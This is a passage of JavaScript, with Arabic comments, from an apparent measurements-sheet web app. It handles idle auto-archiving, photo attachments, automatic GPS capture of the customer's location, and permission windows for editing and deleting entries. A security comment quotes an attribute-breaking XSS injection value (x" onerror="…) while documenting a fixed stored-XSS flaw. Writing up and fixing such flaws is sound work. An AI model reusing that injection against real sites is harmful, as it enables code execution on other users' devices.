        dismissAutoArchiveWarning();
        if (!hasMeaningfulData(buildStateSnapshot())) return;
        const info = { name: (document.getElementById('custName').value || '').trim() || 'بدون اسم',
                       count: jobList.length };
        if (saveMeasurementsSheet('silent')) {
          showAutoSavedBanner();          // فيه زر استرجاع بضغطة واحدة
          resetSheetForNextJob('');       // التنظيف والتهيئة في مسار واحد
        }
        return;
      }

      if (!_autoArchiveWarned) {
        _autoArchiveWarned = true;
        showAutoArchiveWarning();
      }
    }
    setInterval(() => { try { autoArchiveTick(); } catch (e) { console.error('autoArchiveTick:', e); } }, 15000);

    /* ══ فحص فوري عند العودة إلى الصفحة ══
       المتصفحات على الجوال تُجمّد المؤقتات في الخلفية — أحياناً توقفها
       تماماً. فمن يترك الكراسة ويفتح واتساب عشر دقائق ثم يعود، قد لا يكون
       المؤقت عمل إطلاقاً، فيجد كراسة الزبون السابق أمامه ويبدأ الكتابة
       فوقها. وهذا بالضبط ما تحرسه المهلة أصلاً.

       فنفحص لحظة العودة، لا بعد خمس عشرة ثانية منها: الوقت محسوب من
       lastMeasurementAt المحفوظ، فالغياب يُحتسب كاملاً مهما فعل المتصفح. */
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState !== 'visible') return;
      try { autoArchiveTick(); } catch (e) { console.error('autoArchiveTick (عودة):', e); }
    });
    // العودة من ذاكرة المتصفح (زر الرجوع) لا تُطلق visibilitychange دائماً
    window.addEventListener('pageshow', () => {
      setTimeout(() => { try { autoArchiveTick(); } catch (e) {} }, 300);
    });

    // تنبيه قبل التفريغ بدقيقة، مع زر تأجيل — لمن يقف أمام الشاشة الآن
    function showAutoArchiveWarning() {
      dismissAutoArchiveWarning();
      const bar = document.createElement('div');
      bar.id = 'auto-archive-warn';
      bar.style.cssText = 'position:fixed; left:10px; right:10px; bottom:12px; z-index:9560; background:#b45309; color:#fff;' +
        'border-radius:16px; padding:12px 14px; box-shadow:0 12px 30px rgba(0,0,0,.3); font-family:Cairo,Tajawal,sans-serif;' +
        'display:flex; align-items:center; gap:10px; max-width:520px; margin:0 auto;';
      bar.innerHTML =
        '<div style="flex:1; min-width:0; font-size:12px; font-weight:700; line-height:1.7;">' +
          '⏳ مرّت 9 دقائق على آخر مقاس — ستُحفظ الكراسة في الأرشيف ويبدأ عمل جديد بعد دقيقة.' +
        '</div>' +
        '<button onclick="postponeAutoArchive()" style="flex-shrink:0; background:#ffffff; color:#11663b; border:none; border-radius:10px; padding:9px 12px; font-family:Cairo,sans-serif; font-size:12px; font-weight:800; cursor:pointer;">ما زلت أعمل</button>';
      document.body.appendChild(bar);
    }
    function dismissAutoArchiveWarning() {
      const el = document.getElementById('auto-archive-warn');
      if (el) el.remove();
    }
    function postponeAutoArchive() {
      lastMeasurementAt = Date.now();
      _autoArchiveWarned = false;
      try { safeSetItem(AUTO_ARCHIVE_KEY, String(lastMeasurementAt)); } catch (e) {}
      dismissAutoArchiveWarning();
      showMiniToast('تم التأجيل 10 دقائق أخرى ✅', '#047480');
    }

    // لافتة ثابتة تشرح ما حدث وتتيح الاسترجاع (التنبيه العابر قد لا يراه من غاب عن الجهاز)
    function showAutoSavedBanner() {
      const old = document.getElementById('autosave-banner');
      if(old) old.remove();
      const info = lastSavedSheet || {};
      const bar = document.createElement('div');
      bar.id = 'autosave-banner';
      bar.style.cssText = 'position:fixed; left:10px; right:10px; bottom:12px; z-index:9550; background:#0f172a; color:#fff;' +
        'border-radius:16px; padding:12px 14px; box-shadow:0 12px 30px rgba(0,0,0,.3); font-family:Cairo,Tajawal,sans-serif;' +
        'display:flex; align-items:center; gap:10px; max-width:520px; margin:0 auto;';
      bar.innerHTML =
        '<div style="flex:1; min-width:0; font-size:12px; font-weight:700; line-height:1.7;">' +
          '💾 مرّت 10 دقائق على آخر مقاس، فحُفظت مقاسات «' + escapeHtml(info.name || 'بدون اسم') + '» في الأرشيف والكراسة الآن فارغة.' +
        '</div>' +
        '<button onclick="restoreAutoSaved()" style="flex-shrink:0; background:#137644; color:#ffffff; border:none; border-radius:10px; padding:9px 12px; font-family:Cairo,sans-serif; font-size:12px; font-weight:800; cursor:pointer;">استرجاع</button>' +
        '<button onclick="this.parentElement.remove()" style="flex-shrink:0; background:rgba(255, 255, 255, .12); color:#ffffff; border:none; border-radius:10px; width:32px; height:32px; font-size:13px; cursor:pointer;">✕</button>';
      document.body.appendChild(bar);
    }

    // إعادة فتح آخر كراسة حُفظت تلقائياً
    function restoreAutoSaved() {
      const b = document.getElementById('autosave-banner');
      if(b) b.remove();
      if(!lastSavedSheet || !lastSavedSheet.id) { alert('افتح النسخة من قائمة «الأرشيف والنسخ» بالأسفل.'); return; }
      const idx = archives.findIndex(a => a.id === lastSavedSheet.id);
      if(idx === -1) { alert('النسخة محفوظة في «الأرشيف والنسخ» بالأسفل — افتحها من هناك.'); return; }
      loadArchiveByIndex(idx);
      showMiniToast('تم استرجاع الكراسة ✅', '#047480');
    }

    /* لم نعد نُصفّر العدّاد بأي نقرة أو ضغطة مفتاح.
       تصفير العدّاد صار مربوطاً بتغيّر المقاسات نفسها داخل
       touchMeasurementActivity()، تُستدعى من saveCurrentState. */

    /* ============================================================
       صور المشروع — تُحفظ برفقة المقاسات نفسها وتعود معها من الأرشيف
       ------------------------------------------------------------
       تُضغط الصورة قبل الحفظ (أقصى ضلع 1100 بكسل، JPEG) لأن الكراسة كلها
       تُحفظ في مستند واحد لدى Firestore وحدّه ميغابايت واحد؛ صورة الهاتف
       الأصلية وحدها قد تتجاوزه فتفشل مزامنة الكراسة كلها بصمت.
       ============================================================ */
    const PHOTO_MAX_SIDE   = 1100;
    const PHOTO_QUALITY    = 0.62;
    const PHOTOS_MAX       = 8;
    const PHOTOS_MAX_BYTES = 750 * 1024;

    let custPhotos = [];

    function photosBytes() {
      return custPhotos.reduce((n, p) => n + (p.d ? p.d.length : 0), 0);
    }

    // ضغط الصورة داخل المتصفح قبل حفظها
    function compressImage(file) {
      return new Promise((resolve, reject) => {
        const r = new FileReader();
        r.onerror = () => reject(new Error('read'));
        r.onload = e => {
          const img = new Image();
          img.onerror = () => reject(new Error('decode'));
          img.onload = () => {
            let w = img.width, h = img.height;
            const scale = Math.min(1, PHOTO_MAX_SIDE / Math.max(w, h));
            w = Math.round(w * scale); h = Math.round(h * scale);
            const c = document.createElement('canvas');
            c.width = w; c.height = h;
            const cx = c.getContext('2d');
            cx.fillStyle = '#ffffff'; cx.fillRect(0, 0, w, h);
            cx.drawImage(img, 0, 0, w, h);
            resolve(c.toDataURL('image/jpeg', PHOTO_QUALITY));
          };
          img.src = e.target.result;
        };
        r.readAsDataURL(file);
      });
    }

    async function addProjectPhotos(input) {
      const files = Array.from(input.files || []);
      input.value = '';
      if(!files.length) return;
      let added = 0, skipped = 0;
      for(const f of files) {
        if(custPhotos.length >= PHOTOS_MAX) { skipped++; continue; }
        try {
          const d = await compressImage(f);
          if(photosBytes() + d.length > PHOTOS_MAX_BYTES) { skipped++; continue; }
          custPhotos.push({
            id: wsUid('ph_') + '_' + added,
            d: d,
            n: (f.name || 'صورة').replace(/\.[^.]+$/, '').slice(0, 40),
            t: Date.now()
          });
          added++;
        } catch(e) { skipped++; }
      }
      renderProjectPhotos();
      saveCurrentState();
      if(added) showMiniToast('أُضيف ' + added + ' مرفق للجدول ✅', '#0591a1');
      if(skipped) alert('تعذّر إضافة ' + skipped + ' صورة.\n\nالحد الأقصى ' + PHOTOS_MAX + ' صور بحجم إجمالي محدود، حتى تُحفظ الكراسة وتتزامن بأمان. احذف صورة قديمة ثم أعد المحاولة.');
    }

    function deleteProjectPhoto(id) {
      if(!confirm('حذف هذا المرفق؟')) return;
      custPhotos = custPhotos.filter(p => p.id !== id);
      renderProjectPhotos();
      saveCurrentState();
    }

    function renderProjectPhotos() {
      const strip = document.getElementById('photosStrip');
      const cnt   = document.getElementById('photosCount');
      const empty = document.getElementById('photosEmpty');
      if(!strip) return;
      /* ⚠️ ثغرة 8.8.5 (الثانية من نوعها) — مرفقات المشروع تُنفَّذ كوداً.

         custPhotos جزء من saveCurrentState() المحفوظة في measurementJobs،
         وقاعدتها `allow create, update: if isMember()` — أي أن أي عضو
         يكتب فيها ما شاء. ثم تُبنى منها HTML بالوصل النصّي المباشر:

             '<img class="attach-thumb" src="' + p.d + '" alt="">'
             'onclick="openProjectPhoto(\'' + p.id + '\')"'

         فقيمة مثل  x" onerror="…  تُغلق الخاصية وتفتح معالج حدث،
         فيُنفَّذ الكود على جهاز كل من يفتح تلك الكراسة — ومنهم المدير،
         **بصلاحياته هو**. وهي نفس سلسلة اختراق أرشيف القص بالضبط، في
         موضع ثانٍ فات الفحص السابق.

         والمفارقة أن الملف نفسه يملك `safeImgSrc` ويستعملها في ثلاثة
         مواضع أخرى بشكل صحيح — وهذان الموضعان وحدهما فاتهما. */
      strip.innerHTML = custPhotos.map((p, i) => {
        const kb = Math.round((p.d ? p.d.length : 0) * 0.73 / 1024);   // base64 أكبر من الحجم الفعلي بنحو الثلث
        const name = escapeHtml(p.n || ('صورة ' + (i + 1)));
        const pid = escAttr(p.id);
        const psrc = safeImgSrc(p.d);
        return '<div class="attach-row" onclick="openProjectPhoto(\'' + pid + '\')">' +
            (psrc ? '<img class="attach-thumb" src="' + psrc + '" alt="">' : '<div class="attach-thumb"></div>') +
            '<div class="attach-info">' +
              '<div class="attach-name"><i class="fas fa-image" style="color:var(--accent); margin-left:4px;"></i>' + name + '</div>' +
              '<div class="attach-meta">' + kb + ' KB · اضغط للفتح</div>' +
            '</div>' +
            '<button class="attach-del" onclick="event.stopPropagation(); deleteProjectPhoto(\'' + pid + '\')" title="حذف المرفق"><i class="fas fa-trash"></i></button>' +
          '</div>';
      }).join('');
      if(cnt) cnt.textContent = custPhotos.length ? '(' + custPhotos.length + ' من ' + PHOTOS_MAX + ')' : '';
      if(empty) empty.style.display = custPhotos.length ? 'none' : 'block';
    }

    // عرض الصورة بالحجم الكامل
    function openProjectPhoto(id) {
      const p = custPhotos.find(x => x.id === id);
      if(!p) return;
      const ov = document.createElement('div');
      ov.style.cssText = 'position:fixed; inset:0; z-index:9600; background:rgba(15,23,42,.94); display:flex; align-items:center; justify-content:center; padding:14px;';
      ov.onclick = () => ov.remove();
      /* نفس تنقية 8.8.5: المصدر من مجموعة مشتركة يكتبها أي عضو */
      const _psrc = safeImgSrc(p.d);
      if (!_psrc) { alert('تعذّر عرض هذا المرفق — الصورة غير صالحة.'); return; }
      ov.innerHTML = '<img src="' + _psrc + '" style="max-width:100%; max-height:88%; border-radius:12px;">' +
        '<div style="position:absolute; bottom:18px; color:#d1d4d3; font-family:Cairo,sans-serif; font-size:12px; font-weight:700;">اضغط في أي مكان للإغلاق</div>';
      document.body.appendChild(ov);
    }

    /* ============================================================
       موقع العميل — تحديد بأعلى دقة ممكنة
       ------------------------------------------------------------
       أول قراءة يعطيها الهاتف تكون غالباً من الشبكة/الواي‑فاي ودقتها
       ضعيفة (عشرات أو مئات الأمتار). لذلك لا نكتفي بقراءة واحدة، بل
       نفتح متابعة مستمرة (watchPosition) بأعلى دقة ونحتفظ بأدق قراءة
       تصل، حتى تنزل الدقة إلى 8 أمتار أو تنتهي المهلة (30 ثانية).
       ويمكن الضغط على الزر أثناء البحث لاعتماد أفضل قراءة وصلت فوراً.
       ============================================================ */
    const LOC_TARGET_ACC = 8;      // متر — عندها نعتبر الموقع دقيقاً ونتوقف فوراً
    const LOC_MAX_WAIT   = 30000;  // أقصى مدة بحث عن دقة أعلى
    const LOC_WEAK_ACC   = 50;     // متر — أعلى من ذلك نعتبرها دقة ضعيفة وننبّه
    let locWatchId = null, locTimer = null, locBest = null;

    /* ============================================================
       التقاط الموقع تلقائياً بمجرد البدء في كتابة القياسات
       ------------------------------------------------------------
       نبدأ البحث عن إشارة GPS مع أول حرف يُكتب في خانة المقاس، لا بعد
       الانتهاء. السبب عملي: جهاز الهاتف يحتاج عشرات الثواني ليصل إلى
       دقة عالية، فبدء البحث مبكراً يعني أن الإحداثيات تكون جاهزة ودقيقة
       لحظة إضافة المقاس بدل قراءة تقريبية من أبراج الشبكة.
       صامت تماماً: لا رسائل خطأ ولا مقاطعة للعمل. وإن رفض المستخدم إذن
       الموقع لا نعاود السؤال في هذه الكراسة إطلاقاً.
       ============================================================ */
    let locAutoTried = false;     // جُرِّب في هذه الكراسة
    let locAutoSilent = false;    // الالتقاط الجاري بدأ تلقائياً (فلا رسائل)

    function autoCaptureLocationOnce() {
      if (locAutoTried) return;
      if (isSheetLocked()) return;                       // كراسة محفوظة معروضة للقراءة
      if (custLocation && typeof custLocation.lat === 'number') return;  // محدَّد سلفاً
      if (locWatchId !== null) return;                   // التقاط جارٍ بالفعل
      if (!navigator.geolocation) return;
      locAutoTried = true;
      locAutoSilent = true;
      try { captureCustomerLocation(); } catch (e) { locAutoSilent = false; }
    }

    // يُصفَّر مع كل كراسة جديدة حتى يُلتقط موقع الزبون التالي من جديد
    function resetAutoLocation() { locAutoTried = false; locAutoSilent = false; }

    function getLocationMapsUrl() {
      if(!custLocation || typeof custLocation.lat !== 'number') return '';
      // 7 خانات عشرية ≈ دقة سنتيمترات، فلا يضيع شيء من دقة القراءة في الرابط
      return `https://www.google.com/maps?q=${custLocation.lat.toFixed(7)},${custLocation.lng.toFixed(7)}`;
    }

    // يفتح الموقع المحفوظ على الخريطة. لا يعدّله ولا يعيد التقاطه.
    function openSavedLocation() {
      if(!custLocation || typeof custLocation.lat !== 'number') return;
      const url = 'https://www.google.com/maps?q=' + custLocation.lat + ',' + custLocation.lng;
      window.open(url, '_blank', 'noopener');
    }

    function renderLocationButton() {
      const textEl = document.getElementById('locBtnText');
      const btn = document.getElementById('locBtn');
      const resetBtn = document.getElementById('locResetBtn');
      const line = document.getElementById('locSavedLine');
      const lineTxt = document.getElementById('locSavedText');
      const has = !!(custLocation && typeof custLocation.lat === 'number');

      /* السطر النصّي: الإحداثيات ودقّتها ووقت التقاطها.
         يُعرض كنص لا كحقل — الموقع مأخوذ من الجهاز، وتحريره يدوياً يعني
         عنواناً مكتوباً باليد لا يقود إلى مكان. تغييره يقع بزر «إعادة
         تحديد» وحده، وهو يلتقطه من الجهاز من جديد. */
      if (line && lineTxt) {
        if (has) {
          const acc = (typeof custLocation.acc === 'number') ? ' · دقة ±' + custLocation.acc + ' م' : '';
          const when = custLocation.at ? ' · ' + new Date(custLocation.at).toLocaleDateString('ar-EG') : '';
          lineTxt.textContent = custLocation.lat.toFixed(6) + ', ' + custLocation.lng.toFixed(6) + acc + when;
          line.style.display = 'flex';
          line.title = 'اضغط لفتح الموقع على الخريطة';
        } else {
          line.style.display = 'none';
          lineTxt.textContent = '';
        }
      }

      if(!textEl || !btn || !resetBtn) return;
      if(has) {
        // الزر صار «إعادة التحديد» — الفتح صار من السطر أعلاه
        textEl.textContent = 'إعادة تحديد الموقع';
        btn.style.background = 'var(--soft)';
        btn.style.color = 'var(--dark)';
        resetBtn.style.display = 'none';
      } else {
        textEl.textContent = 'تحديد موقع العميل';
        btn.style.background = 'var(--soft)';
        btn.style.color = 'var(--dark)';
        resetBtn.style.display = 'none';
      }
    }

    function stopLocWatch() {
      if(locWatchId !== null) { try { navigator.geolocation.clearWatch(locWatchId); } catch(e) {} locWatchId = null; }
      if(locTimer) { clearTimeout(locTimer); locTimer = null; }
    }

    function captureCustomerLocation() {
      if(!navigator.geolocation) { alert('⚠️ متصفحك لا يدعم تحديد الموقع'); return; }
      if(locWatchId !== null) { finalizeLocation(true); return; }   // ضغطة أثناء البحث = اعتمد الأفضل الآن
      locBest = null;
      const textEl = document.getElementById('locBtnText');
      if(textEl) textEl.textContent = 'جارِ التقاط الموقع بدقة…';
      locWatchId = navigator.geolocation.watchPosition(onLocFix, onLocError, {
        enableHighAccuracy: true,   // يجبر الجهاز على استخدام GPS لا الشبكة فقط
        timeout: LOC_MAX_WAIT,
        maximumAge: 0               // لا نقبل أي قراءة مخزّنة قديمة
      });
      locTimer = setTimeout(() => finalizeLocation(true), LOC_MAX_WAIT);
    }

    // نحتفظ بأدق قراءة وصلت حتى الآن فقط
    function onLocFix(pos) {
      const acc = (typeof pos.coords.accuracy === 'number') ? pos.coords.accuracy : 9999;
      if(!locBest || acc < locBest.acc) {
        locBest = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: acc };
      }
      const textEl = document.getElementById('locBtnText');
      if(textEl) textEl.textContent = `دقة ±${Math.round(locBest.acc)} م — اضغط للاعتماد`;
      if(locBest.acc <= LOC_TARGET_ACC) finalizeLocation(false);
    }

    function onLocError(err) {
      if(locBest) { finalizeLocation(true); return; }   // وصلت قراءة جيدة قبل الخطأ: نعتمدها
      stopLocWatch();
      renderLocationButton();
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
      // الالتقاط التلقائي لا يقاطع المستخدم برسائل — يفشل بصمت ويبقى الزر لمن أراد
      if (locAutoSilent) { locAutoSilent = false; return; }
      alert(err && err.code === 1
        ? '⚠️ صلاحية الموقع مرفوضة. فعّلها للتطبيق من إعدادات الهاتف ثم أعد المحاولة.'
        : '⚠️ تعذر تحديد الموقع. تأكد من تشغيل GPS، واخرج إلى مكان مكشوف ثم أعد المحاولة.');
    }

    function finalizeLocation(manual) {
      stopLocWatch();
      if(!locBest) {
        renderLocationButton();
        try { updateShareHeader(); } catch (e) {}
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
        if(manual && !locAutoSilent) alert('⚠️ لم تصل أي إشارة موقع بعد. تأكد من تشغيل GPS وأعد المحاولة في مكان مكشوف.');
        locAutoSilent = false;
        return;
      }
      custLocation = {
        lat: locBest.lat,
        lng: locBest.lng,
        acc: Math.round(locBest.acc),
        at: Date.now()
      };
      locBest = null;
      saveCurrentState();
      renderLocationButton();
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
      const auto = locAutoSilent; locAutoSilent = false;
      if(custLocation.acc > LOC_WEAK_ACC) {
        showMiniToast(`تم الحفظ بدقة ±${custLocation.acc} م فقط — للأفضل اخرج لمكان مكشوف وأعد التحديد`, '#1ba560');
      } else {
        showMiniToast(`${auto ? '📍 التُقط موقع الزبون تلقائياً' : 'تم تحديد الموقع'} بدقة ±${custLocation.acc} متر ✅`, '#0591a1');
      }
    }

    function handleLocationClick() {
      if(locWatchId !== null) { finalizeLocation(true); return; }
      /* الفتح على الخريطة صار من السطر النصّي أعلاه، فبقي للزر معنى واحد:
         التقاط الموقع أو إعادة التقاطه — وهو الطريق الوحيد لتغييره. */
      if(custLocation && typeof custLocation.lat === 'number') {
        if(!confirm('الموقع محفوظ بالفعل.\n\nهل تريد إعادة تحديده من موقعك الحالي؟\n(لفتحه على الخريطة اضغط سطر الموقع أعلاه)')) return;
        custLocation = null;
        renderLocationButton();
        try { updateShareHeader(); } catch (e) {}
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
        saveCurrentState();
      }
      captureCustomerLocation();
    }

    function resetCustomerLocation(e) {
      e.stopPropagation();
      stopLocWatch();
      locBest = null;
      custLocation = null;
      saveCurrentState();
      renderLocationButton();
      try { updateShareHeader(); } catch (e) {}   // رأس الجدول يعرض الموقع أيضاً
    }

    // ===== نظام الأنواع الديناميكي: بيفيسي وسرانتي أساسيان وثابتان، ويمكن إضافة أي عدد من الأنواع الأخرى =====
    const CUSTOM_TYPE_PALETTE = ['#1ba560', '#d33722', '#0591a1', '#156e42', '#199959', '#2d8459', '#b98c0f', '#199c5a', '#178f53', '#147a47'];

    /* ============================================================
       مهلة تعديل/حذف المقاسات
       ------------------------------------------------------------
       العضو: يعدّل أو يحذف المقاسات التي أضافها هو فقط، وخلال ساعتين
       من إضافتها. مقاس أضافه عضو آخر مقفول عليه من أول لحظة.
       المدير: بلا أي قيد، في أي وقت وعلى أي مقاس.
       كل مقاس يُضاف من الآن يحمل وقت إضافته ومعرّف واسم من أضافه.
       المقاسات القديمة (المسجّلة قبل هذا التحديث بلا وقت) تُعامل
       كمنتهية المهلة للأعضاء، ويبقى تعديلها بيد المدير.
       ============================================================ */
    const EDIT_WINDOW_MS = 2 * 60 * 60 * 1000;   // مهلة التعديل: ساعتان
    /* مهلة الحذف أقصر من مهلة التعديل عمداً: تصحيح رقم خطأ شيء، وإزالة
       صف من الجدول شيء آخر — الثاني يُخفي أثر العمل فلا يبقى ما يُراجَع.
       بعد نصف ساعة يبقى الحذف بيد المدير وحده. */
    const DELETE_WINDOW_MS = 30 * 60 * 1000;    // مهلة الحذف: نصف ساعة

    function isManagerUser() {
      return !!(window.currentShopUser && window.currentShopUser.role === 'manager');
    }

    /* v264 — حارس صلاحية الوحدة داخل الصفحة نفسها.
       حارس shared.js يمنع الدخول للصفحة، لكن الإجراءات الحساسة يجب أن
       تتحقق مرة ثانية لحظة التنفيذ أيضاً؛ فهذا يمنع تنفيذ زر قديم أو
       استدعاء دالة مباشرة بعد تغيّر صلاحية العضو أثناء بقاء الصفحة مفتوحة. */
    function canUseMeasurementsModule() {
      try {
        if (typeof window.wsCanAccess === 'function') {
          return window.wsCanAccess('measurements', window.currentShopUser);
        }
      } catch (e) {}
      return isManagerUser();
    }
    function requireMeasurementsAccess(action) {
      if (canUseMeasurementsModule()) return true;
      alert('⛔ ليست لديك صلاحية ' + (action || 'استخدام كراسة القياسات') + '.');
      return false;
    }
    function currentUserName() {
      return (window.currentShopUser && window.currentShopUser.name) || '';
    }
    function currentUserUid() {
      return (window.currentShopUser && window.currentShopUser.uid) || '';
    }
    // ختم الوقت وهوية صاحب الإضافة على كل مقاس جديد
    function stampNewItem(item) {
      // شبكة أمان: بعض المسارات تضيف مقاسات بلا كتابة في الخانات
      // (اللصق الجماعي، أزرار الإضافة السريعة) — نضمن الالتقاط فيها أيضاً
      try { autoCaptureLocationOnce(); } catch (e) {}
      item.executionId=wsNewExecutionId();if(!item.note)item.note=window.WSEngine?.preferences(currentUserUid()).defaultNote||'';
      item.addedAt = Date.now();
      item.addedBy = currentUserName();
      item.addedByUid = currentUserUid();
      return item;
    }
    /* هل أضاف المستخدم الحالي هذا المقاس بنفسه؟
       نعتمد المعرّف (uid) لأنه لا يتكرر ولا يتغيّر بتغيّر الاسم،
       ومع المقاسات القديمة بلا معرّف نرجع لمقارنة الاسم. */
    function isOwnItem(item) {
      if(!item || !window.currentShopUser) return false;
      if(item.addedByUid) return item.addedByUid === currentUserUid();
      return !!item.addedBy && item.addedBy === currentUserName();
    }
    function canEditItem(item) {
      if(isManagerUser()) return true;                                  // المدير: بلا قيد
      if(!item || typeof item.addedAt !== 'number') return false;       // مقاس قديم بلا وقت
      if(!isOwnItem(item)) return false;                                // مقاس عضو آخر
      return (Date.now() - item.addedAt) < EDIT_WINDOW_MS;              // خلال ساعتين
    }
    /* صلاحية حذف صف: المدير بلا قيد، والعضو لمقاساته هو وخلال نصف ساعة.
       لا يحذف عضوٌ مقاسات عضو آخر إطلاقاً مهما كان الوقت. */
    function canDeleteItem(item) {
      if(isManagerUser()) return true;
      if(!item || typeof item.addedAt !== 'number') return false;
      if(!isOwnItem(item)) return false;
      return (Date.now() - item.addedAt) < DELETE_WINDOW_MS;
    }
    // رسالة رفض الحذف: تفرّق بين «مقاس عضو آخر» و«انتهت مهلة النصف ساعة»
    function deleteLockMessage(item) {
      if(!item) return 'تعذّر تحديد المقاس.';
      if(!isOwnItem(item)) {
        return '⛔ لا يمكنك حذف مقاس أضافه ' + (item.addedBy || 'عضو آخر') + '.\n\nالحذف لصاحب المقاس أو للمدير.';
      }
      const mins = Math.floor((Date.now() - item.addedAt) / 60000);
      return '⛔ انتهت مهلة حذف هذا المقاس.\n\n' +
             'مضى على إضافته ' + mins + ' دقيقة، والمهلة نصف ساعة.\n' +
             'اطلب من المدير حذفه.';
    }

    // كم بقي من المهلة بالدقائق (للعرض بجانب الصف)
    function remainingEditMinutes(item) {
      if(!item || typeof item.addedAt !== 'number') return 0;
      return Math.max(0, Math.ceil((EDIT_WINDOW_MS - (Date.now() - item.addedAt)) / 60000));
    }
    // شارة مختصرة للوقت المتبقي: "45 د" أو "1س 58د"
    function editLeftLabel(item) {
      const m = remainingEditMinutes(item);
      if(m <= 0) return '';
      if(m < 60) return m + ' د';
      const h = Math.floor(m / 60), r = m % 60;
      return h + 'س' + (r ? ' ' + r + 'د' : '');
    }
    // رسالة الرفض: تفرّق بين "مقاس عضو آخر" و"انتهت المهلة"
    function lockMessage(item) {
      if(item && typeof item.addedAt === 'number' && !isOwnItem(item)) {
        const who = item.addedBy ? ('العضو: ' + item.addedBy) : 'عضو آخر';
        return '⛔ هذا المقاس ليس من إضافتك.\n\nأضافه ' + who + ' بتاريخ '
             + formatWesternDateTime(new Date(item.addedAt))
             + '.\nلا يعدّله إلا من أضافه خلال ساعتين، أو المدير في أي وقت.';
      }
      let msg = '⏳ انتهت مهلة تعديل هذا المقاس.\n\n';
      if(item && typeof item.addedAt === 'number') {
        msg += 'وقت إضافته: ' + formatWesternDateTime(new Date(item.addedAt)) + '\n';
      } else {
        msg += 'هذا المقاس مسجّل قبل تفعيل نظام المهلة.\n';
      }
      if(item && item.addedBy) msg += 'أضافه: ' + item.addedBy + '\n';
      msg += '\nالتعديل والحذف متاحان لمن أضاف المقاس خلال ساعتين فقط. بعدها يلزم المدير.';
      return msg;
    }
    function explainLock(idx) { alert(lockMessage(jobList[idx])); }

    // حذف صف من الجدول مع احترام المهلة
    function deleteRow(idx) {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }
      if (editingIndex > -1) { alert('⚠️ أنهِ التعديل الحالي أولاً.'); return; }
      const item = jobList[idx];
      if(!canDeleteItem(item)) { alert(deleteLockMessage(item)); renderTable(); return; }
      jobList.splice(idx, 1);
      renderTable();
      updateMainActionLabel();
      saveCurrentState();
      showMiniToast('🗑️ تم حذف المقاس وحفظ التغيير مباشرة', '#047480');
    }

    // تعديل ناتج الصف يدوياً من داخل الجدول — ممنوع بعد انتهاء المهلة
    function updateRowResult(idx, input) {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }
      const item = jobList[idx];
      if(!canEditItem(item)) { alert(lockMessage(item)); renderTable(); return; }
      item.res = input.value;
      calcSum();
      renderTable();
      updateMainActionLabel();
      saveCurrentState();
      showMiniToast('✏️ تم تعديل الناتج وحفظه مباشرة', '#047480');
    }

    function sanitizeCustomTypes(list) {
      const src = Array.isArray(list) ? list : [];
      const out = [];
      const seenNames = new Set();
      src.forEach(t => {
        if (!t || !t.id || !String(t.name || '').trim()) return;
        const name = String(t.name).trim();
        const n = normName(name);
        // النوع الرئيسي له هوية واحدة. لا نسمح بنسخة مخصصة من PVC/سرانتي/الخ.
        const canonical = canonicalTypeId(name);
        if (canonical === 'pvc' || DEFAULT_EXTRA_TYPES.some(d => d.id === canonical)) return;
        // «سرانتي» القديم لا يعود كنوع مخصص حتى لو بقي في التخزين المحلي.
        if (n === normName('سرانتي')) return;
        if (seenNames.has(n)) return;
        seenNames.add(n);
        out.push(Object.assign({}, t, { originalName: t.originalName || name }));
      });
      return out;
    }

    function getCustomTypes() {
      const v = wsParse(safeGetItem('ws_custom_types'), []);   // إصلاح 8.8
      const clean = sanitizeCustomTypes(v);
      if (JSON.stringify(clean) !== JSON.stringify(v)) {
        try { safeSetItem('ws_custom_types', JSON.stringify(clean)); } catch(e) {}
      }
      const systems=window.WSSystems?.customTypes()||[];
      return clean.filter(t=>!systems.some(x=>x.id===t.id)).concat(systems);
    }
    function saveCustomTypes(types, opts) {
      safeSetItem('ws_custom_types', JSON.stringify(types));
      // الأنواع المخصصة أصبحت مشتركة أيضاً: عند إنشاء نوع جديد نستخدم
      // merge ذرياً حتى لا يمسح جهاز عضوٍ آخر نوعاً أضافه في نفس اللحظة.
      if (opts && opts.fromServer) return;
      try {
        const payload = JSON.stringify(types);
        if (payload === _lastCustomTypesJSON) return;
        _lastCustomTypesJSON = payload;
        if (opts && opts.merge && db && db.runTransaction) {
          db.runTransaction(async tx => {
            const ref = db.collection('measurementTypes').doc('list');
            const snap = await tx.get(ref);
            const data = snap.exists ? (snap.data() || {}) : {};
            const server = Array.isArray(data.customTypes) ? data.customTypes : [];
            const byId = {};
            server.forEach(t => { if (t && t.id) byId[t.id] = t; });
            types.forEach(t => { if (t && t.id) byId[t.id] = t; });
            tx.set(ref, { customTypes: Object.values(byId), updatedAt: Date.now(), updatedBy: (window.currentShopUser && window.currentShopUser.name) || '' }, { merge: true });
          }).catch(e => console.warn('مزامنة النوع المخصص:', e));
        } else {
          fsSet('measurementTypes', 'list', { customTypes: types, updatedAt: Date.now(), updatedBy: (window.currentShopUser && window.currentShopUser.name) || '' });
        }
      } catch (e) { console.warn('مزامنة الأنواع المخصصة:', e); }
    }
    function nextCustomTypeColor() {
      return CUSTOM_TYPE_PALETTE[getCustomTypes().length % CUSTOM_TYPE_PALETTE.length];
    }

    /* ============================================================
       الإضافات السريعة (سرانتي خارجي / ناموسية متحركة / ناموسية ثابتة / أي أيقونة تُضاف لاحقاً)
       ------------------------------------------------------------
       كل إضافة هنا نوع كامل له اسمه ولونه وشارته الخاصة في الجدول وإجماليه وبنده المالي،
       لكنه لا يظهر ضمن أزرار الأقسام في الأعلى لأنه لا يُقاس بنفسه غالباً، بل يأخذ
       نفس مقاس النوع المكتوب في الأعلى: إمّا بضغطة على أيقونته، أو تلقائياً عند وضع ✓ أمامها.
       ============================================================ */
